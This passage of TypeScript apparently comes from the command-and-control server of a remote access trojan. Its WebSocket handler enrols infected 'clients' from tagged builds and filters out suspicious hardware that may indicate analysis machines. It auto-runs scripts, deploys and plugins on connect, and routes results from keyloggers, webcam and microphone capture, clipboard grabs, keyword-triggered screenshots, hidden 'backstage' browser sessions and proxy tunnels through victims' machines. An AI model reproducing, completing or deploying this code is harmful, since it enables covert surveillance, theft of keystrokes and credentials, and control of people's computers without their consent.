          if (ws.data.enrollmentState !== "verifying") return;
          if (verified) {
            resolvedBuildId = verified.bid;
            builtByUserId = verified.uid ?? undefined;
            const build = getBuild(verified.bid);
            if (build) {
              builtByUserId = build.builtByUserId ?? builtByUserId;
              initialClientTag = build.initialClientTag;
              isRevoked = !!build.blocked || isBuildBanned(verified.bid);
            } else {
              isRevoked = isBuildBanned(verified.bid);
            }
          } else {
            const build = getBuildByTag(buildTag);
            if (build) {
              resolvedBuildId = build.id;
              builtByUserId = build.builtByUserId;
              initialClientTag = build.initialClientTag;
              isRevoked = !!build.blocked || isBuildBanned(build.id);
            }
          }
        }

        if (buildTag && isRevoked) {
          const shortId = resolvedBuildId ? resolvedBuildId.substring(0, 8) : "<unknown>";
          logger.info(`[build-block] rejecting agent ${resolvedId} from revoked build ${shortId}`);
          try {
            ws.send(
              encodeMessage({
                type: "command",
                commandType: "disconnect",
                id: crypto.randomUUID(),
                payload: { reason: "build_blocked" },
              }),
            );
          } catch {}
          rejectEnrollment(ws);
          try { ws.close(4007, "build_blocked"); } catch {}
          return;
        }

        if (enrollmentStatus === "denied") {
          logger.info(`[purgatory] denied client ${resolvedId} tried to connect`);
          ws.send(encodeMessage({ type: "enrollment_status", status: "denied" }));
          rejectEnrollment(ws);
          try { ws.close(4003, "denied"); } catch {}
          return;
        }

        if (enrollmentStatus === "pending") {
          const enrollConfig = getConfig().enrollment;

          if (!enrollConfig.requireApproval) {
            let blocked = false;
            if (enrollConfig.autoApproveUnlessSuspicious) {
              const flags = computeClientSuspiciousFlags({
                hwid: typeof (payload as any).hwid === "string" ? (payload as any).hwid : null,
                cpu: typeof (payload as any).cpu === "string" ? (payload as any).cpu : null,
                gpu: typeof (payload as any).gpu === "string" ? (payload as any).gpu : null,
                ram: typeof (payload as any).ram === "string" ? (payload as any).ram : null,
                os: typeof (payload as any).os === "string" ? (payload as any).os : null,
                host: typeof (payload as any).host === "string" ? (payload as any).host : null,
                user: typeof (payload as any).user === "string" ? (payload as any).user : null,
                ip: ip || null,
              });
              if (flags.length > 0) {
                blocked = true;
                logger.info(`[purgatory] auto-approve blocked for ${resolvedId} — suspicious: ${flags.join(", ")}`);
              }
            }
            if (!blocked) {
              enrollmentStatus = "approved";
              logger.info(`[purgatory] auto-approved ${resolvedId} (requireApproval=false)`);
            }
          }

          if (enrollmentStatus !== "approved") {
          const geoip = await getGeoip();
          if (ws.data.enrollmentState !== "verifying") return;
          const geo = ip ? geoip.lookup(ip) : undefined;
          const countryRaw = geo?.country || (payload as any).country || "ZZ";
          const country = /^[A-Z]{2}$/i.test(countryRaw) ? countryRaw.toUpperCase() : "ZZ";

          const _s = (v: unknown, max = 256): string | undefined => {
            if (typeof v !== "string") return undefined;
            return v.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "").slice(0, max);
          };
          const _percent = (v: unknown): number | undefined => {
            if (typeof v !== "number" || !Number.isFinite(v)) return undefined;
            const n = Math.round(v);
            return n >= 0 && n <= 100 ? n : undefined;
          };
          const batteryPercent = _percent((payload as any).batteryPercent);
          const storePendingClient = (targetId: string): boolean => {
            const initialTagForNewClient = existing || clientExists(targetId)
              ? undefined
              : initialClientTag;
            return upsertPendingClientRow({
              id: targetId,
              hwid: _s((payload as any).hwid) || targetId,
              role: "client",
              ip: ip || undefined,
              host: _s((payload as any).host),
              os: _s((payload as any).os),
              arch: _s((payload as any).arch, 32),
              version: _s((payload as any).version, 64),
              user: _s((payload as any).user),
              monitors: (payload as any).monitors || undefined,
              cpu: _s((payload as any).cpu),
              gpu: _s((payload as any).gpu),
              ram: _s((payload as any).ram, 64),
              batteryPercent,
              batteryCharging: batteryPercent !== undefined ? !!(payload as any).batteryCharging : undefined,
              country,
              lastSeen: Date.now(),
              online: 0 as any,
              publicKey,
              keyFingerprint,
              enrollmentStatus: "pending",
              buildTag: buildTag || undefined,
              builtByUserId,
              ...(initialTagForNewClient ? { customTag: initialTagForNewClient } : {}),
            });
          };

          let storedPendingClient = storePendingClient(resolvedId);
          if (!storedPendingClient && resolvedId !== keyFingerprint) {
            resolvedId = keyFingerprint;
            ws.data.clientId = resolvedId;
            logger.info(`[purgatory] concurrent ID collision detected — reassigned to ${resolvedId}`);
            storedPendingClient = storePendingClient(resolvedId);
          }
          if (!storedPendingClient) {
            logger.warn(`[purgatory] unable to reserve identity for ${resolvedId}`);
            rejectEnrollment(ws);
            try { ws.close(4002, "identity_collision"); } catch {}
            return;
          }

          logger.info(`[purgatory] client ${resolvedId} is pending approval`);
          ws.send(encodeMessage({ type: "enrollment_status", status: "pending" }));
          deps.notifyDashboard();
          const isNewPurgatoryEntry = !existing || existing.enrollmentStatus !== "pending";
          if (isNewPurgatoryEntry) {
            deps.notifyDashboardClientEvent("client_purgatory", {
              id: resolvedId,
              host: _s((payload as any).host),
              user: _s((payload as any).user),
              os: _s((payload as any).os),
              ip: ip || undefined,
              country,
            });
            deps.broadcastClientEvent("client_purgatory", {
              id: resolvedId,
              host: _s((payload as any).host),
              user: _s((payload as any).user),
              os: _s((payload as any).os),
              ip: ip || undefined,
              country,
            });
          }
          rejectEnrollment(ws);
          setTimeout(() => { try { ws.close(4001, "pending"); } catch {} }, 100);
          return;
          }
        }

        let wasKnown = clientExists(resolvedId);
        const reserveApprovedIdentity = (targetId: string): boolean => upsertClientRow({
          id: targetId,
          publicKey,
          keyFingerprint,
          enrollmentStatus: "approved",
          buildTag: buildTag || undefined,
          builtByUserId,
          online: 0 as any,
          lastSeen: Date.now(),
        });

        let storedApprovedIdentity = reserveApprovedIdentity(resolvedId);
        if (!storedApprovedIdentity && resolvedId !== keyFingerprint) {
          resolvedId = keyFingerprint;
          ws.data.clientId = resolvedId;
          wasKnown = clientExists(resolvedId);
          logger.info(`[purgatory] concurrent approved ID collision detected — reassigned to ${resolvedId}`);
          storedApprovedIdentity = reserveApprovedIdentity(resolvedId);
        }
        if (!storedApprovedIdentity) {
          logger.warn(`[purgatory] unable to reserve approved identity for ${resolvedId}`);
          rejectEnrollment(ws);
          try { ws.close(4002, "identity_collision"); } catch {}
          return;
        }

        const existingClient = clientManager.getClient(resolvedId);
        if (existingClient?.ws && existingClient.ws !== ws) {
          logger.info(`[purgatory] kicking existing socket for ${resolvedId} (superseded)`);
          try { existingClient.ws.close(4004, "superseded"); } catch {}
          clientManager.deleteClient(resolvedId);
          stopAllProxiesForClient(resolvedId);
          deps.clearPendingNotificationScreenshots(resolvedId);
          deps.clearClientPluginState(resolvedId);
          for (const [cmdId, pending] of deps.pendingScripts) {
            if (pending.clientId === resolvedId) {
              clearTimeout(pending.timeout);
              pending.resolve({ ok: false, error: "Client reconnected (superseded)" });
              deps.pendingScripts.delete(cmdId);
            }
          }
          for (const [cmdId, pending] of deps.pendingCommandReplies) {
            if (pending.clientId === resolvedId) {
              clearTimeout(pending.timeout);
              pending.resolve({ ok: false, message: "Client reconnected (superseded)" });
              deps.pendingCommandReplies.delete(cmdId);
            }
          }
          deps.rdStreamingState.delete(resolvedId);
          deps.backstageStreamingState.delete(resolvedId);
          deps.webcamStreamingState.delete(resolvedId);
        }

        ws.data.wasKnown = wasKnown;
        const initialTagForNewClient = wasKnown ? undefined : initialClientTag;

        const infoObj: ClientInfo = {
          id: resolvedId,
          role: "client",
          ws,
          lastSeen: Date.now(),
          country: "",
          ip,
          online: true,
          publicKey,
          keyFingerprint,
          enrollmentStatus: "approved" as any,
          ...(initialTagForNewClient ? { customTag: initialTagForNewClient } : {}),
        };

        queueClientDbUpdate({
          id: resolvedId,
          publicKey,
          keyFingerprint,
          enrollmentStatus: "approved",
          buildTag: buildTag || undefined,
          builtByUserId,
          ...(initialTagForNewClient ? { customTag: initialTagForNewClient } : {}),
          online: 1 as any,
          lastSeen: Date.now(),
        });

        await handleHello(infoObj, payload as Hello, ws, ip);
        if (ws.data.enrollmentState !== "verifying") {
          const current = clientManager.getClient(resolvedId);
          if (current?.ws === ws) {
            clientManager.deleteClient(resolvedId);
            clearClientSyncState(resolvedId);
          } else if (!current) {
            clearClientSyncState(resolvedId);
          }
          return;
        }
        const helloWinner = clientManager.getClient(resolvedId);
        if (helloWinner?.ws && helloWinner.ws !== ws) {
          logger.warn(`[purgatory] concurrent hello lost for ${resolvedId}`);
          rejectEnrollment(ws);
          try { ws.close(4004, "superseded"); } catch {}
          return;
        }
        ws.data.enrollmentState = "authenticated";
        clearEnrollmentTimeout(ws);
        releaseEnrollmentAdmission(ws);
        clientManager.addClient(resolvedId, infoObj);
        const lastCrashReason = sanitizeCrashString((payload as any).lastCrashReason, 64);
        if (lastCrashReason) {
          deps.handleCrashReport(resolvedId, {
            reason: lastCrashReason,
            detail: sanitizeCrashString((payload as any).lastCrashDetail, 1200),
            host: infoObj.host,
            user: infoObj.user,
            os: infoObj.os,
          });
        }

        const notificationConfig = deps.getNotificationConfig();
        try {
          ws.send(
            encodeMessage({
              type: "hello_ack",
              id: resolvedId,
              protocolVersion: WIRE_PROTOCOL_VERSION,
              commandVersions: getNegotiatedCommandVersions(infoObj),
              notification: {
                keywords: notificationConfig.keywords || [],
                minIntervalMs: notificationConfig.minIntervalMs || 8000,
                clipboardEnabled: notificationConfig.clipboardEnabled || false,
              },
            }),
          );
        } catch (sendErr) {
          logger.warn(`[purgatory] failed to send hello_ack to ${resolvedId}: ${sendErr}`);
        }

        scheduleQueuedClientDbFlush();
        clientManager.addClient(infoObj.id, infoObj);

        clearThumbnail(resolvedId);

        const reconnectedWithinGrace = cancelPendingOffline(infoObj.id);

        deps.dispatchAutoScriptsForConnection(infoObj, ws);
        deps.dispatchAutoDeploysForConnection(infoObj, ws);
        deps.dispatchAutoLoadPlugins(infoObj);
        deps.dispatchKeylogArchiveSync?.(infoObj.id, ws);
        deps.sendDesktopCommand(infoObj, "webcam_list", {});
        deps.notifyDashboard();
        if (!reconnectedWithinGrace) {
          deps.notifyDashboardClientEvent("client_online", {
              id: infoObj.id,
              host: infoObj.host,
              user: infoObj.user,
              os: infoObj.os,
              ip: infoObj.ip,
              country: infoObj.country,
            });
          deps.broadcastClientEvent("client_online", {
              id: infoObj.id,
              host: infoObj.host,
              user: infoObj.user,
              os: infoObj.os,
              ip: infoObj.ip,
              country: infoObj.country,
            });
        }
        if (infoObj.role === "client") {
          deps.notifyRemoteDesktopStatus(resolvedId, "online");
          metrics.recordConnection();

          const wasKnown = Boolean(ws.data.wasKnown);
          logAudit({
            timestamp: Date.now(),
            username: "system",
            ip: ws.data?.ip || ip || "unknown",
            action: wasKnown ? AuditAction.CLIENT_RECONNECT : AuditAction.CLIENT_FIRST_CONNECT,
            targetClientId: infoObj.id,
            success: true,
            details: JSON.stringify({ host: infoObj.host, os: infoObj.os, user: infoObj.user }),
          });
          (ws as any).data.wasKnown = true;

          if (buildTag) {
            deps.handleBuildTagConnection(infoObj.id, resolvedBuildId, builtByUserId, keyFingerprint);
          }
        }
        break;
      }
      case "ping":
        handlePing(client, payload as Ping, ws);
        break;
      case "pong":
        handlePong(client, payload);
        break;
      case "frame":
        if ((payload as any)?.header?.fps === 0) {
          const pending = deps.takePendingNotificationScreenshot(client.id);
          if (pending) {
            let bytes: Uint8Array | null = null;
            if ((payload as any).data instanceof Uint8Array) {
              bytes = (payload as any).data;
            } else if ((payload as any).data instanceof ArrayBuffer) {
              bytes = new Uint8Array((payload as any).data);
            } else if (ArrayBuffer.isView((payload as any).data)) {
              const view = (payload as any).data as ArrayBufferView;
              bytes = new Uint8Array(view.buffer, view.byteOffset, view.byteLength);
            }

            const format = String((payload as any)?.header?.format || "jpeg");
            const width = Number((payload as any)?.header?.width) || undefined;
            const height = Number((payload as any)?.header?.height) || undefined;
            if (bytes) {
              deps.storeNotificationScreenshot(pending, bytes, format, width, height);
            }
          }
        }
        if (handleFrame(client, payload, shouldRelayFrameToViewers(payload))) {
          try { ws.send(encodeMessage({ type: "frame_ack" })); } catch {}
        }
        break;
      case "screenshot_result":
        handleScreenshotThumbnailResult(client, payload);
        deps.handleNotificationScreenshotResult(client.id, payload);
        requestRemoteDesktopKeyframeAfterScreenshot(client.id);
        break;
      case "console_output":
        deps.handleConsoleOutput(client.id, payload);
        break;
      case "desktop_encoder_capabilities":
        deps.handleDesktopEncoderCapabilities(client.id, payload);
        break;
      case "desktop_cursor":
        deps.handleDesktopCursor(client.id, payload);
        break;
      case "desktop_stream_stats":
        deps.handleDesktopStreamStats(client.id, payload);
        break;
      case "file_list_result":
      case "file_download":
      case "file_upload_result":
      case "file_read_result":
      case "file_search_result":
      case "file_icon_result":
      case "file_thumb_result":
      case "file_dirsize_result":
      case "file_peek_result":
      case "file_hash_result":
      case "command_result":
        if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
          const pending = deps.pendingCommandReplies.get((payload as any).commandId);
          if (pending?.clientId === client.id) {
            clearTimeout(pending.timeout);
            pending.resolve({
              ok: Boolean((payload as any).ok),
              message: typeof (payload as any).message === "string" ? (payload as any).message : "",
            });
            deps.pendingCommandReplies.delete((payload as any).commandId);
          }
        }
        if (typeof (payload as any).commandId === "string") {
          deps.notifyRdInputLatency((payload as any).commandId);
        }
        deps.handleNotificationScreenshotFailure(
          (payload as any).commandId,
          (payload as any).ok,
          (payload as any).message,
          client.id,
        );
        deps.handleFileBrowserMessage(client.id, payload);
        if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
          deps.handleProxyConnectResult(
            client.id,
            (payload as any).commandId,
            Boolean((payload as any).ok),
          );
        }
        break;
      case "client_logs_result":
        if (typeof (payload as any).commandId === "string") {
          const pending = deps.pendingCommandReplies.get((payload as any).commandId);
          if (pending?.clientId === client.id) {
            clearTimeout(pending.timeout);
            pending.resolve({
              ok: Boolean((payload as any).ok),
              message: JSON.stringify(payload),
            });
            deps.pendingCommandReplies.delete((payload as any).commandId);
          }
        }
        break;
      case "command_progress":
        deps.handleFileBrowserMessage(client.id, payload);
        break;
      case "process_list_result":
      case "process_icon_result":
        deps.handleProcessMessage(client.id, payload);
        break;
      case "keylog_file_list":
      case "keylog_file_content":
      case "keylog_clear_result":
      case "keylog_delete_result":
      case "keylog_permission_result":
        deps.handleKeylogArchiveMessage?.(client.id, payload, ws);
        deps.handleKeyloggerMessage(client.id, payload);
        break;
      case "script_result": {
        logger.debug(
          `[script] client=${client.id} ok=${(payload as any).ok} output_length=${(payload as any).output?.length || 0}`,
        );
        const cmdId = (payload as any).commandId;
        if (cmdId && deps.pendingScripts.has(cmdId)) {
          const pending = deps.pendingScripts.get(cmdId)!;
          if (pending.clientId !== client.id) break;
          clearTimeout(pending.timeout);
          pending.resolve({
            ok: (payload as any).ok,
            result: (payload as any).output || "",
            error: (payload as any).error,
          });
          deps.pendingScripts.delete(cmdId);
        }
        break;
      }
      case "plugin_event":
        deps.handlePluginEvent(client.id, payload);
        break;
      case "notification":
        deps.handleNotification(client.id, payload);
        break;
      case "voice_uplink":
        deps.handleVoiceUplink(client.id, payload);
        break;
      case "desktop_audio_uplink":
        deps.handleDesktopAudioUplink(client.id, payload);
        break;
      case "webcam_devices":
        deps.handleWebcamDevices(client.id, payload);
        deps.notifyDashboard();
        break;
      case "backstage_clone_progress":
        deps.handlebackstageCloneProgress(client.id, payload);
        break;
      case "backstage_lookup_result":
        deps.handlebackstageLookupResult(client.id, payload);
        break;
      case "backstage_browser_check_result":
        deps.handlebackstageBrowserCheckResult(client.id, payload);
        break;
      case "backstage_installed_apps_result":
        deps.handlebackstageInstalledAppsResult(client.id, payload);
        break;
      case "backstage_dxgi_status":
        deps.handlebackstageDXGIStatus(client.id, payload);
        break;
      case "backstage_browser_launch_status":
        deps.handlebackstageBrowserLaunchStatus(client.id, payload);
        break;
      case "backstage_window_list_result":
        deps.handlebackstageWindowListResult(client.id, payload);
        break;
      case "clipboard_content":
        deps.handleClipboardContent(client.id, payload);
        break;
      case "webrtc_p2p_answer":
        deps.handleWebrtcP2PAnswer(client.id, payload);
        break;
      case "webrtc_p2p_ice":
        deps.handleWebrtcP2PIce(client.id, payload);
        break;
      case "proxy_data": {
        const connId = (payload as any).connectionId;
        const bytes = normalizeProxyTunnelChunk((payload as any).data);
        if (typeof connId === "string" && connId.length > 0 && connId.length <= 128 && bytes) {
          deps.handleProxyTunnelData(client.id, connId, bytes);
        }
        break;
      }
      case "proxy_close": {
        const connId = (payload as any).connectionId;
        if (typeof connId === "string") {
          deps.handleProxyTunnelClose(client.id, connId);
        }
        break;
      }
      case "disconnect_info": {
        const disconnect = normalizeDisconnectInfo(payload);
        if (disconnect) {
          ws.data.disconnectReason = disconnect.reason;
          ws.data.disconnectDetail = disconnect.detail;
          logger.debug(`[disconnect_info] ${client.id} reason=${disconnect.reason}`);
        }
        break;
      }
      default:
        break;
    }
  } catch (err) {
    logger.error("[message] handler error", err);
    if (socketRole === "client" && ws.data.enrollmentState !== "authenticated") {
      rejectEnrollment(ws);
      try { ws.close(1011, "enrollment_error"); } catch {}
    }
  }
}

export function handleWebSocketClose(
  ws: ServerWebSocket<SocketData>,
  code: number,
  reason: unknown,
  deps: WsLifecycleDeps,
): void {
  unregisterViewerSocket(ws);
  const clientId = ws.data.clientId;
  const role = ws.data.role as string;
  const sessionId = ws.data.sessionId;

  clearEnrollmentTimeout(ws);
  releaseEnrollmentAdmission(ws);

  if (role === "console_viewer") {
    if (sessionId) {
      sessionManager.deleteConsoleSession(sessionId);
      const target = clientManager.getClient(clientId);
      deps.stopConsoleOnTarget(target, sessionId);
    }
    return;
  }

  if (role === "rd_viewer") {
    deps.cleanupRdViewerP2P(ws);
    let removedClientId = clientId;
    for (const [sid, sess] of sessionManager.getAllRdSessions().entries()) {
      if (sess.viewer === ws) {
        removedClientId = sess.clientId;
        sessionManager.deleteRdSession(sid);
        break;
      }
    }

    const stillViewing = sessionManager.hasRdSessionsForClient(removedClientId);
    if (!stillViewing) {
      const target = clientManager.getClient(removedClientId);
      deps.sendDesktopCommand(target, "desktop_stop", {});
      deps.sendDesktopCommand(target, "webrtc_stop", { kind: "desktop" });
      deps.rdStreamingState.delete(removedClientId);
      logger.debug(`[rd] cleaned up state for client ${removedClientId}`);
    }
    return;
  }

  if (role === "webcam_viewer") {
    deps.cleanupRdViewerP2P(ws);
    let removedClientId = clientId;
    for (const [sid, sess] of sessionManager.getAllWebcamSessions().entries()) {
      if (sess.viewer === ws) {
        removedClientId = sess.clientId;
        sessionManager.deleteWebcamSession(sid);
        break;
      }
    }

    const stillViewing = sessionManager.hasWebcamSessionsForClient(removedClientId);
    if (!stillViewing) {
      const target = clientManager.getClient(removedClientId);
      deps.sendDesktopCommand(target, "webcam_stop", {});
      deps.sendDesktopCommand(target, "webrtc_stop", { kind: "webcam" });
      deps.webcamStreamingState.delete(removedClientId);
      logger.debug(`[webcam] cleaned up state for client ${removedClientId}`);
    }
    return;
  }

  if (role === "backstage_viewer") {
    deps.cleanupRdViewerP2P(ws);
    let removedClientId = clientId;
    for (const [sid, sess] of sessionManager.getAllbackstageSessions().entries()) {
      if (sess.viewer === ws) {
        removedClientId = sess.clientId;
        sessionManager.deletebackstageSession(sid);
        break;
      }
    }

    const stillViewing = sessionManager.hasbackstageSessionsForClient(removedClientId);
    if (!stillViewing) {
      const target = clientManager.getClient(removedClientId);
      if (target) {
        deps.sendbackstageCommand(target, "backstage_stop", {});
        deps.sendbackstageCommand(target, "webrtc_stop", { kind: "backstage" });
      }
      deps.backstageStreamingState.delete(removedClientId);
      logger.debug(`[backstage] cleaned up state for client ${removedClientId}`);
    }
    return;
  }

  if (role === "file_browser_viewer") {
    if (sessionId) {
      sessionManager.deleteFileBrowserSession(sessionId);
    }
    return;
  }

  if (role === "process_viewer") {
    if (sessionId) {
      sessionManager.deleteProcessSession(sessionId);
    }
    return;
  }

  if (role === "keylogger_viewer") {
    if (sessionId) {
      sessionManager.deleteKeyloggerSession(sessionId);
    }
    return;
  }

  if (role === "voice_viewer") {
    deps.cleanupVoiceViewer(ws);
    return;
  }

  if (role === "desktop_audio_viewer") {
    deps.cleanupDesktopAudioViewer(ws);
    return;
  }

  if (role === "notifications_viewer") {
    if (sessionId) {
      sessionManager.deleteNotificationSession(sessionId);
    }
    return;
  }

  if (role === "dashboard_viewer") {
    sessionManager.deleteDashboardSession(ws.data.sessionId || clientId);
    return;
  }

  if (role === "chat_viewer") {
    if (sessionId) {
      sessionManager.deleteChatSession(sessionId);
    }
    return;
  }

  // Until hello authentication completes, clientId is only an untrusted URL
  // claim. It must not drive cleanup for a real client with that ID.
  if (role === "client" && ws.data.enrollmentState !== "authenticated") {
    ws.data.enrollmentState = "rejected";
    ws.data.enrollmentNonce = undefined;
    return;
  }

  const currentClient = clientManager.getClient(clientId);
  if (currentClient && currentClient.ws !== ws) {
    return;
  }

  const storedDisconnectReason = ws.data.disconnectReason;
  const storedDisconnectDetail = ws.data.disconnectDetail;

  clientManager.deleteClient(clientId);
  stopAllProxiesForClient(clientId);
  clearClientSyncState(clientId);
  deps.notifyConsoleClosed(clientId, "Client disconnected");
  deps.clearPendingNotificationScreenshots(clientId);
  deps.clearClientPluginState(clientId);
  for (const [cmdId, pending] of deps.pendingScripts) {
    if (pending.clientId === clientId) {
      clearTimeout(pending.timeout);
      pending.resolve({ ok: false, error: "Client disconnected" });
      deps.pendingScripts.delete(cmdId);
    }
  }
  for (const [cmdId, pending] of deps.pendingCommandReplies) {
    if (pending.clientId === clientId) {
      clearTimeout(pending.timeout);
      pending.resolve({ ok: false, message: "Client disconnected" });
      deps.pendingCommandReplies.delete(cmdId);
    }
  }
  deps.rdStreamingState.delete(clientId);
  deps.backstageStreamingState.delete(clientId);
  deps.webcamStreamingState.delete(clientId);
  stopRemoteDesktopRecording(clientId, "client disconnected");

  if (role === "client" && currentClient) {
    schedulePendingOffline(
      clientId,
      {
        id: clientId,
        host: currentClient.host,
        user: currentClient.user,
        os: currentClient.os,
        ip: currentClient.ip,
        country: currentClient.country,
      },
      storedDisconnectReason,
      storedDisconnectDetail,
      deps,
    );
  }

  if (role === "client") {
    metrics.recordDisconnection();
    logAudit({
      timestamp: Date.now(),
      username: "system",
      ip: ws.data?.ip || "unknown",
      action: AuditAction.CLIENT_DISCONNECT,
      targetClientId: clientId,
      success: true,
      details: JSON.stringify({ code, reason: String(reason || ""), disconnectReason: storedDisconnectReason || null }),
    });
  }
}
